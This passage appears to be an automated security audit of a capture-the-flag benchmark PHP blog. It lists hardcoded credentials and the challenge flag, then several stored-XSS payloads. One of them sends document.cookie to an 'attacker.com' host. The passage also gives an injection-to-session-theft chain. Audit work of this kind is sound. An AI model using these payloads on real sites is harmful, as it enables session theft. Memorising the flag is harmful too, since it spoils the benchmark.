- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` - Contains **hardcoded database credentials** (line 2: `$conn = new mysqli('db', 'user', 'password', 'blogDB');`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` - Contains **hardcoded database credentials** (line 12: `$conn = new mysqli('db', 'user', 'password', 'blogDB');`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/docker-compose.yml` - Infrastructure secrets including **MySQL root password** (line 7: `MYSQL_ROOT_PASSWORD: rootpassword`), **application user password** (lines 10, 31: `MYSQL_PASSWORD: password`), and password exposure in healthcheck command (line 14: `--password=password`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/.env` - **FLAG secret** (line 1: `FLAG="flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33}"`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/db_init.sql` - **Default admin credentials** in plaintext (line 58: `VALUES ('admin', 'ONEverySecurePassword_!')`)

### Middleware & Input Validation

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` - Input handling with **inadequate validation** (line 37: user input captured, line 41: **unescaped SQL injection vulnerability**, line 52: escaping applied too late after vulnerable query)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` - Authentication input processing with `mysqli_real_escape_string()` (lines 17-18) but **no password hashing** and **string concatenation** instead of prepared statements (line 20)

### Logging & Monitoring

- **No Application-Level Logging Files** - Zero security event logging, audit trails, or monitoring implementations in codebase
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/000-default.conf` - Apache log configuration (lines 17-18: `ErrorLog /var/log/apache2/error2.log`, `CustomLog /var/log/apache2/access2.log combined`) providing only generic HTTP access logs without security event details

### Infrastructure & Deployment

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/docker-compose.yml` - Service orchestration with database and web service definitions, health checks (lines 13-16 for database, 35-38 for web), service dependencies (line 23: `depends_on: - db`), and network configuration (implicit default network)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/Dockerfile` - Multi-line container build with base image `php:7.4-apache` (line 1), extension installation (line 3: `docker-php-ext-install mysqli`), Apache module enablement (line 5: `a2enmod rewrite`), system package installation (line 8), PHP error configuration (lines 9-13), FLAG injection (lines 20-21), and entrypoint specification
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/entrypoint.sh` - Container initialization with database availability loop using netcat (lines 2-6), database initialization command (line 10: `mysql -u "$MYSQL_USER" -p"$MYSQL_PASSWORD" -h db --database="$MYSQL_DATABASE" < /app/db_init.sql`), and Apache startup (line 13: `apache2-foreground`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/Makefile` - Build automation including external common targets (line 1: `include ../common.mk`)

### CTF Flag Storage

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/.env` - **FLAG source definition** (line 1: plaintext FLAG value)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/Dockerfile` - **FLAG injection mechanism** (lines 20-21: build argument receives FLAG from docker-compose, sed command replaces `@FLAG@` placeholder in admin.php with actual FLAG value during build)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` - **FLAG reveal locations** (line 6: displayed if valid session exists, line 26: displayed immediately after successful authentication), containing `@FLAG@` placeholder in source that becomes actual FLAG value post-build
- **No filesystem flag files** - Verified no `/flag.txt`, `/FLAG`, `/app/flag.txt`, or similar flag files exist; FLAG is injected into application code rather than stored as separate file

---

## 9. XSS Sinks and Render Contexts

The application contains **five active stored XSS vulnerabilities** and **one potential reflected XSS vulnerability**, all resulting from the **complete absence of output encoding** throughout the codebase. Every location where database content is rendered into HTML lacks `htmlspecialchars()`, `htmlentities()`, or any sanitization, creating multiple attack vectors for persistent cross-site scripting that executes in all users' browsers.

### XSS Sink #1: Stored XSS via Blog Post Title (CRITICAL)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` lines 68-69  
**Sink Type:** Direct echo into HTML body content  
**Render Context:** HTML body context within `<h2>` heading element  
**User Input Source:** Database field `posts.title` (stored content, potentially attacker-controlled via SQL injection or future admin interface)  
**Output Encoding:** **NONE** - Zero sanitization functions present  
**Network Accessibility:** **PUBLIC** - index.php is publicly accessible without authentication

**Vulnerable Code:**
```php
while($row = $result->fetch_assoc()) {
    echo "<div class='post'>
            <h2>{$row['title']}</h2>
```

**Exploitation Scenario:**  
If an attacker exploits the SQL injection vulnerability at line 41 to insert malicious content into the `posts` table, or gains admin access to create posts with malicious titles, JavaScript embedded in the `title` field will execute in every visitor's browser when the blog page loads.

**Attack Example:**
```sql
-- Via SQL injection at line 41:
INSERT INTO posts (title, category, content, image, published) 
VALUES ('<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>', 'Tech', 'content', 'x.jpg', 1);
```

**Impact:** Session theft via cookie exfiltration (if HttpOnly flag were present, this would be blocked, but the flag is missing per Section 3), credential harvesting via fake login forms injected into page, malicious redirects, cryptocurrency mining scripts, or defacement affecting all blog visitors.

### XSS Sink #2: Stored XSS via Blog Post Category (CRITICAL)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` line 70  
**Sink Type:** Direct echo into HTML body content  
**Render Context:** HTML body context within `<p>` paragraph element  
**User Input Source:** Database field `posts.category` (stored content)  
**Output Encoding:** **NONE**  
**Network Accessibility:** **PUBLIC**

**Vulnerable Code:**
```php
echo "<div class='post'>
        <h2>{$row['title']}</h2>
        <p>Category: {$row['category']}</p>
```

**Exploitation:** Identical to XSS Sink #1, but exploiting the `category` field instead of `title`. Attacker injects malicious JavaScript into the category field via SQL injection or compromised admin access.

**Attack Example:**
```sql
INSERT INTO posts (title, category, content, image, published) 
VALUES ('Normal Title', '<img src=x onerror="alert(document.domain)">', 'content', 'x.jpg', 1);
```

### XSS Sink #3: Stored XSS via Blog Post Content (CRITICAL)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` line 72  
**Sink Type:** Direct echo into HTML body content  
**Render Context:** HTML body context within `<p>` paragraph element  
**User Input Source:** Database field `posts.content` (stored content, truncated to 200 characters but not sanitized)  
**Output Encoding:** **NONE**  
**Network Accessibility:** **PUBLIC**

**Vulnerable Code:**
```php
<p>" . substr($row['content'], 0, 200) . "...</p>
```

**Exploitation:** Despite `substr()` truncation to 200 characters, XSS payloads under 200 characters execute successfully. Common XSS vectors fit within this limit.

**Attack Example:**
```sql
INSERT INTO posts (title, category, content, image, published) 
VALUES ('Title', 'Tech', '<svg onload=alert(1)>', 'x.jpg', 1);
-- Payload is only 21 characters, well under 200-character truncation
```

**Impact:** Even with truncation, sophisticated XSS payloads under 200 characters can exfiltrate data, inject iframes, or load external malicious scripts.

### XSS Sink #4: Stored XSS via Category Dropdown (CRITICAL)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` line 29  
**Sink Type:** Direct echo into HTML attribute and element content  
**Render Context:** HTML attribute context (`value` attribute of `<option>` element) AND HTML body context (text content of `<option>`)  
**User Input Source:** Database field `posts.category` (from distinct categories query)  
**Output Encoding:** **NONE**  
**Network Accessibility:** **PUBLIC**

**Vulnerable Code:**
```php
while ($row = $cat_result->fetch_assoc()) {
    $selected = ($row['category'] == $category) ? 'selected' : '';
    echo "<option value='{$row['category']}' {$selected}>{$row['category']}</option>";
}
```

**Exploitation:** Attacker-controlled category values are interpolated into both the `value` attribute (enclosed in single quotes) and as text content between `<option>` tags. This creates **attribute injection** opportunities.

**Attack Examples:**
```sql
-- Attribute breakout with event handler:
INSERT INTO posts (title, category, content, image, published) 
VALUES ('Title', "' onload='alert(document.cookie)' x='", 'content', 'x.jpg', 1);

-- Result: <option value='' onload='alert(document.cookie)' x='' >...

-- Tag injection:
INSERT INTO posts (title, category, content, image, published) 
VALUES ('Title', "'></option><script>alert(1)</script><option value='", 'content', 'x.jpg', 1);

-- Result: <option value=''></option><script>alert(1)</script><option value=''>...
```

**Impact:** Attribute-context XSS allows breaking out of the `value` attribute to inject arbitrary attributes or close the tag entirely to inject malicious elements.

### XSS Sink #5: Stored XSS via Image Filename and Alt Text (HIGH)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` line 71  
**Sink Type:** Direct echo into HTML attributes  
**Render Context:** URL attribute context (`src`) and generic attribute context (`alt`)  
**User Input Source:** Database fields `posts.image` (in src) and `posts.title` (in alt), both stored content  
**Output Encoding:** **NONE**  
**Network Accessibility:** **PUBLIC**

**Vulnerable Code:**
```php
<img src='images/{$row['image']}' alt='{$row['title']}' style='width:200px;height:200px;'/>
```

**Exploitation:** Both `image` and `title` fields are interpolated into single-quoted attributes without encoding. Attackers can inject event handlers or break out of attributes.

**Attack Examples:**
```sql
-- Via image field (src attribute):
INSERT INTO posts (title, category, content, image, published) 
VALUES ('Title', 'Tech', 'content', "x' onerror='alert(1)", 1);

-- Result: <img src='images/x' onerror='alert(1)' alt='...

-- Via title field (alt attribute):
INSERT INTO posts (title, category, content, image, published) 
VALUES ("' onerror='alert(document.domain)", 'Tech', 'content', 'x.jpg', 1);

-- Result: <img src='...' alt='' onerror='alert(document.domain)' style='...

-- JavaScript protocol in src:
INSERT INTO posts (title, category, content, image, published) 
VALUES ('Title', 'Tech', 'content', "' src='javascript:alert(1)' x='", 1);
```

**Impact:** Event handlers like `onerror` execute when image fails to load, and `javascript:` protocol URIs execute code directly. Both enable full XSS exploitation.

### XSS Sink #6: Potential Reflected XSS via Error Message (LOW RISK CURRENTLY)

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` line 47  
**Sink Type:** Direct echo into HTML body content  
**Render Context:** HTML body context within `<p>` element with inline style  
**User Input Source:** Variable `$errorMessage` (currently hardcoded string, but architecturally vulnerable)  
**Output Encoding:** **NONE**  
**Network Accessibility:** **PUBLIC** (admin.php accessible without authentication to display login form)

**Vulnerable Code:**
```php
if ($errorMessage !== '') {
    echo "<p style='color: red;'>$errorMessage</p>";
}
```

**Current Status:** The `$errorMessage` variable is currently set to a hardcoded string `'Invalid username or password.'` on line 28, making this **NOT EXPLOITABLE** in the current codebase. However, this represents a **latent vulnerability** if code is modified to include user input in error messages.

**Hypothetical Exploitation (if modified):**
```php
// If code were changed to:
$errorMessage = 'Invalid username: ' . $_POST['username'];

// Attack:
POST /admin.php
username=<script>alert(1)</script>&password=x

// Result: <p style='color: red;'>Invalid username: <script>alert(1)</script></p>
```

**Risk Assessment:** **LOW** in current implementation but **HIGH** if error handling is modified to echo user input, which is a common development pattern for providing detailed error feedback.

---

### XSS Summary and Attack Chain

**Total XSS Sinks:** 5 active vulnerabilities + 1 potential vulnerability  
**Affected Render Contexts:**
- HTML Body Context: 3 instances (title, category, content in lines 69-72)
- HTML Attribute Context: 2 instances (option value/text in line 29, img src/alt in line 71)

**Critical Finding:** **ZERO output encoding** functions (`htmlspecialchars()`, `htmlentities()`, `filter_var()`, `strip_tags()`) are used anywhere in the application, confirmed by codebase-wide search.

**Attack Chain for Complete Compromise:**
1. **Initial Access:** Exploit SQL injection at `index.php` line 41 via `GET /?category=PAYLOAD`
2. **Database Manipulation:** Use `UNION` injection to insert malicious content into `posts` table with XSS payload in `title`, `category`, or `content` fields
3. **Persistence:** Malicious post is stored in database with `published = 1`, ensuring it displays to all visitors
4. **XSS Execution:** Every visitor to the blog homepage executes attacker's JavaScript
5. **Session Theft:** JavaScript exfiltrates `PHPSESSID` cookie (exploitable because HttpOnly flag is missing per Section 3)
6. **Admin Access:** Attacker uses stolen admin session cookie to access `/admin.php` and retrieve FLAG
7. **Complete Compromise:** Attacker now has admin session, database access via SQL injection, and can inject additional malicious content

**Defense Evaluation:**
- **No Content-Security-Policy:** Application lacks CSP headers (confirmed in Section 6) that would mitigate XSS impact by restricting script sources
- **No Input Validation:** No filtering of `<script>`, `onerror`, or other XSS vectors at input stage
- **No Output Encoding:** Complete absence of `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` or equivalent functions
- **Implicit Trust of Database:** Application assumes all database content is safe, creating stored XSS vulnerabilities

---

## 10. SSRF Sinks

After comprehensive analysis of all network-accessible application components, **no Server-Side Request Forgery (SSRF) sinks were identified** in this application.

### Analysis Methodology

Exhaustive search for all common SSRF sink patterns across the entire codebase:

**HTTP/HTTPS Client Functions (PHP):**
- Searched for: `file_get_contents()`, `fopen()`, `readfile()`, `curl_init()`, `curl_exec()`, `curl_setopt()`, `stream_context_create()`, `fsockopen()`, `pfsockopen()`, `socket_connect()`
- **Result:** ZERO instances found in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` or `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php`

**URL Openers and Remote File Includes:**
- Searched for: `include()`, `require()`, `include_once()`, `require_once()` with dynamic or user-controlled paths, `file()`, `parse_url()` followed by network operations
- **Result:** ZERO dynamic includes with external URLs; no remote file inclusion capabilities

**XML/SOAP Processors:**
- Searched for: `simplexml_load_file()`, `simplexml_load_string()` with external entities, `XMLReader::open()`, `DOMDocument::load()`, `SoapClient`, `xml_parse()`
- **Result:** ZERO XML processing code; application does not handle XML input

**HTTP Redirect Handlers:**
- Searched for: `header('Location: ...')` with user-controllable input, `http_redirect()`, framework redirect functions
- **Result:** ZERO redirect functions; application does not implement open redirects

**Image/Media Processing:**
- Searched for: ImageMagick functions, GD library with URL inputs, `getimagesize()` with remote URLs, FFmpeg invocations
- **Result:** ZERO image processing; images are static files served directly from `images/` directory with no server-side manipulation

**External API Integrations:**
- Searched for: OAuth client libraries, OIDC discovery, JWKS fetchers, webhook senders, external REST API calls
- **Result:** ZERO external API integrations; application is entirely self-contained

**Webhook and Callback Systems:**
- Searched for: Webhook test/ping functionality, OAuth callback verification, payment gateway integrations
- **Result:** ZERO webhook handlers; application does not accept external callbacks

**Database Proxy Functions:**
- Searched for: `mysqli::real_connect()` with user-controlled host parameter, dynamic database connection strings
- **Result:** Database host is hardcoded as `'db'` in both PHP files (line 2 of index.php, line 12 of admin.php); no user control over connection parameters

### User Input Analysis

**All User Input Points Examined:**

**1. GET Parameter: `category` (index.php line 37)**
- **Usage:** SQL query parameter only
- **Flow:** `$_GET['category']` → SQL query (line 41 and 52-58) → No outbound requests
- **Conclusion:** Input used exclusively for database query construction; does not influence any HTTP client calls

**2. POST Parameters: `username`, `password` (admin.php lines 17-18)**
- **Usage:** SQL query parameters only
- **Flow:** `$_POST['username']` and `$_POST['password']` → SQL query (line 20) → No outbound requests
- **Conclusion:** Credentials used only for local database authentication; no external authentication service calls

**3. Session Data: `$_SESSION['admin_logged_in']` (admin.php lines 5, 25)**
- **Usage:** Boolean flag for authorization state
- **Flow:** Session storage → Authorization check → No outbound requests
- **Conclusion:** Session data does not influence any network operations

### Application Functionality Analysis

**Operations Performed by Application:**

**1. Database Queries (MySQL):**
- **Target:** Internal MySQL container at hostname `db`, port 3306
- **Scope:** Docker internal network only, not externally accessible
- **User Control:** User input influences SQL queries (SQL injection vulnerability exists), but queries target only the internal database—no user control over connection destination

**2. Static File Serving:**
- **Mechanism:** Apache serves files from `/var/www/html/` directory
- **Files:** `styles.css`, `images/morning-dew.jpg`, `images/sunset.jpg`
- **User Control:** No user control over file paths served; image paths in database are not validated but are prepended with static `images/` directory path (line 71: `src='images/{$row['image']}'`)—potential path traversal but not SSRF

**3. HTML Rendering:**
- **Mechanism:** PHP echo statements generate HTML from database content and static templates
- **Output:** HTML sent to client browser
- **Network Activity:** None from server side; browser may load resources, but server initiates no outbound requests

**No Outbound HTTP Requests:** The application performs **zero server-side HTTP requests** to any destination (internal or external). All network activity is limited to:
- Receiving inbound HTTP requests on port 51233
- Sending database queries to internal MySQL container
- Sending HTTP responses to clients

### Scope Verification

**In-Scope Components Analyzed (Network-Accessible):**
- ✅ `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` - Public blog page
- ✅ `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` - Admin authentication page
- ✅ Static assets (CSS, images) - No server-side processing

**Out-of-Scope Components Excluded (Not Network-Accessible):**
- ❌ `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/Dockerfile` - Build-time only
- ❌ `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/entrypoint.sh` - Container initialization script, not invoked by HTTP requests
- ❌ `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/db_init.sql` - Database initialization, executed once at container startup
- ❌ `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/docker-compose.yml` - Infrastructure configuration

### Conclusion

**No SSRF sinks identified in network-accessible components.**

The application is a **pure CRUD application** (Create, Read, Update, Delete) operating exclusively on its local MySQL database without any functionality for:
- Fetching remote URLs
- Proxying requests
- Integrating with external APIs
- Processing webhooks
- Fetching metadata from user-provided URLs
- Server-side image processing from remote sources
- OAuth/OIDC discovery from user-controlled providers
- DNS lookups or network reconnaissance based on user input

**Architecture Limitation:** The application's minimal functionality and complete absence of outbound HTTP client capabilities mean SSRF vulnerabilities are **architecturally impossible** in the current implementation. Any future development adding features like URL import, image fetching, webhook testing, or external API integration would introduce SSRF attack surface and require careful validation of user-controlled URLs.

---

**PRE-RECON CODE ANALYSIS COMPLETE**

## Authenticated Scans

### SCHEMATHESIS
Status: skipped
No API schemas found

---
Report generated at: 2025-10-31T00:44:10.689Z